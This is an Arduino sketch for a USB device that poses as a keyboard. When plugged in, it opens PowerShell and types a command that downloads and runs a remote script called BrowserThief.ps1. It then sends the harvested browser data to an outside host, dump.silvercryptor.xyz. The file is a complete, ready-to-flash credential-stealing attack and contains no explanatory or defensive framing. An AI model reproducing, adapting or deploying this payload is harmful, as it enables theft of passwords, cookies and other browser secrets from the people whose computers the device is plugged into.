#include "Keyboard.h"


void setup() {

  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell");
  delay(100);
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ScribblerCoder/BrowserThief/main/BrowserThief.ps1');pumpndump -hq https://dump.silvercryptor.xyz;exit");
  delay(100);
  typeKey(KEY_RETURN);
  Keyboard.end();

}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(100);
  Keyboard.release(key);
  delay(100);
}

void loop() {

}